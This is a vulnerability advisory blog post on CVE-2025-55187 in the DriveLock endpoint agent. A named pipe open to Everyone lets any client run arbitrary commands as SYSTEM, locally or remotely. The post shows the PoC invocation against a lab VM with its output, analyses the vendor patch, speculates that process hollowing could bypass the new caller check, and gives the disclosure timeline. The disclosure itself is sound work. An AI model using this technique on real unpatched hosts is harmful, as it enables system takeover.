---
layout: post
date:   2025-09-26
categories: [advisory]

title:  "[Advisory - DriveLock] LPE/RCE as NT-Authority\\System via Named pipe - duplicate"
advisory:
  product: DriveLock
  homepage: https://www.drivelock.com/
  vulnerable_version: "25.1.2.57576"
  fixed_version: "25.1.4.58328 - 25.1 Patch 2, 24.2.6.58383 - 24.2 Patch 4, 24.1.5.58384 - 24.1 Patch 3"
  found: 2025-09-10
  cve: CVE-2025-55187
  impact_text: CRITICAL
  impact_score: 9.9
  cvss: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
---

# IMPORTANT - Duplicate
The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch.

# Product description
> The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
> This means you are secure at the centre, with all paths of access to your sensitive data blocked.

*Cite: [DriveLock - Homepage](https://www.drivelock.com/en/)*

This platform includes the `DriveLock Core` component, which is an agent installed on the client machines.

## Tested software version
```ps1
PS C:\Users\win.pentest> Get-FileHash "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          3ED7B4BA35E4784EED44F3A20394EF24FE9BB73CEF0B46D1D732EFD50C82F19B       C:\Program Files\CenterTools\DriveLock\DriveLock.exe

PS C:\> Get-ItemProperty "C:\Program Files\CenterTools\DriveLock\DriveLock.exe" |fl -Property versioninfo

VersionInfo : File:             C:\Program Files\CenterTools\DriveLock\DriveLock.exe
              InternalName:     DriveLock.exe
              OriginalFilename: DriveLock.exe
              FileVersion:      25.1.2.57576
              FileDescription:  Agent service
              Product:          DriveLock
              ProductVersion:   25.1.2.57576
              Debug:            False
              Patched:          False
              PreRelease:       False
              PrivateBuild:     False
              SpecialBuild:     False
              Language:         English (United States)
```

# Vulnerability overview

During the installation of the product a Window service named `DriveLock` is installed.

```ps1
PS C:\Users\win.pentest> Get-CimInstance -ClassName win32_service | ?{$_.Name -match '^drivelock'} |select *


Name                    : DriveLock
Status                  : OK
ExitCode                : 0
DesktopInteract         : False
ErrorControl            : Normal
PathName                : "C:\Program Files\CenterTools\DriveLock\DriveLock.exe"
ServiceType             : Own Process
StartMode               : Auto
Caption                 : DriveLock
Description             : Locks removable drives based on company policy.
InstallDate             :
CreationClassName       : Win32_Service
Started                 : True
SystemCreationClassName : Win32_ComputerSystem
SystemName              : DESKTOP-LSJFSMS
AcceptPause             : False
AcceptStop              : True
DisplayName             : DriveLock
ServiceSpecificExitCode : 0
StartName               : LocalSystem
State                   : Running
TagId                   : 0
CheckPoint              : 0
DelayedAutoStart        : False
ProcessId               : 1708
WaitHint                : 0
PSComputerName          :
```
This services exposes the [named pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes) `\Device\NamedPipe\drivelock`.
![Named pipe - drivelock](/assets/drivelock/drivelock-pipe.PNG)
*Named pipe - drivelock*

As shown above the group `everyone` has the access level `Full control` on this object. This allows an authenticated attacker and even `anonymous` to open the pipe.

The service, exposing the named pipe, implements a simple `remote procedure call - RPC` interface by reading a command struct from the connected clients.

The handler for the commands is located at the `Relative virtual address (RVA)` - `0x2b0a80` in the `drivelock.exe` binary.
One of these supported commands is `PM_COMMAND`, which is a simple wrapper of `CreateProcessW`.

![Command handler - PM_COMMAND](/assets/drivelock/onMsg-exec.PNG)
*Command handler - PM_COMMAND*

The argument `lpCommandLine` of the `CreateProcessW` call is taken from the command struct sent by the connected client, which allows full control of the executed binary and its arguments.

**Summary**:

An attacker which can open a connection to the named pipe `drivelock`, can execute a arbitrary command, controlling the full command line, in the context of the user `NT authority\System`.
This can be done locally to escalate privileges - `LPE` - to `NT authority\System` from a normal user or the `named pipe` can be opend on a remote machine which allows `remote code execution - RCE` as `NT authority\System`.

## Proof of concept
To exploit this a connection to the named pipe `drivelock` has to be opend and a `PM_COMMAND` message should be sent.
The following snippets show running the included [PoC - dl-pipe-exe](/assets/drivelock/poc/dl-pipe-exec.cpp) on the local machine against a VM - `DESKTOP-LSJFSMS - 192.168.56.103` with an installed `DriveLock` agent.

It executes the command `whoami > C:\rce-poc.txt` to get the user details of the user who created the process.

```ps1
PS > .\Debug\dl-pipe-exec.exe 192.168.56.103 cmd /C '\"whoami /all >C:\rce-poc.txt\"'
Using host: 192.168.56.103
------< PIPE exploit >----
Opening pipe: \\192.168.56.103\pipe\drivelock
Using cmdline: -- cmd /C "whoami /all >C:\rce-poc.txt" --
Result: 1000 -- 9007628751470592
```
*Running PoC on local system*

![Procmon details about processes](/assets/drivelock/procmon-exec.PNG)
*Procmon details about processes*

```ps1
PS C:\Users\win.pentest> type C:\rce-poc.txt

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
```
*Output of the executed whoami command*

# Solution
Patch for version `25.1`, `24.2` and `24.1` were published on **2025-07-30**, which fixes the vulnerability.

Patched versions:
* 25.1.4.58328 - 25.1 Patch 2
* 24.2.6.58383 - 24.2 Patch 4
* 24.1.5.58384 - 24.1 Patch 3

No other mitigations are known.

## Patch analysis
To fix the above shown vulnerability they implemented a few security check and settings.

1) First of all the call to `CreateNamedPipeW` includes the `dwOpenMode` flag `PIPE_REJECT_REMOTE_CLIENTS`. This removes the `RCE` from the vulnerability, because opening the `NamedPipe` over the network results in a ErrorCode `0x5 - Access denied`.

2) The second mitigation includes a check if the binary is running as a server, which is true in the service component. If this is true, it disables a few commands implemented in `on_pipeMessage` handler, like the exploited `PM_COMMAND` operation.

![onMessage - fixed](/assets/drivelock/onMsg-fixed.png)
*onMessage - fixed*

3) The third mitigation checks the path of the client process, which connted to the pipe and ensures that it is placed in the installation directory of `DirveLock`. For example if a client process binary is `C:\temp\exploit.exe` the message handling is aborted with an error message `Forbidden caller`.

![onMessage - forbidden caller](/assets/drivelock/onMsg-forbidden-caller.png)
*onMessage - forbidden caller*

This is is only active if the `isServer` flag is true. But imho this is not working as intended. Using `process hollowing` an attacker should be able to spoof the binary path of the process and bypasses the check. I did not verify this.

# Timeline
* 2025-09-13: Initial contact via `security@drivelock.com`
* 2025-09-16: No answer, try to contact `info@drivelock.com`
* 2025-09-18: No answer, try to contact `security@drivelock.com` again
* 2025-09-19: No answer, try to contact via [DriveLock - Contact](https://www.drivelock.com/en/contact), got marketing E-Mail a few minutes later but no answer
* 2025-09-19: Posted tweet on `X` referencing `@drivelock_de` for contact
* 2025-09-22: Posted message on `LinkedIn`, referencing `drivelockse`
* 2025-09-23: Received S/MIME Certificate from `Mark.Hartmann@drivelock.com`
* 2025-09-23: Sent report to DriveLock
* 2025-09-24: Received answer, that the found vulnerability is a duplicate and a patch is already available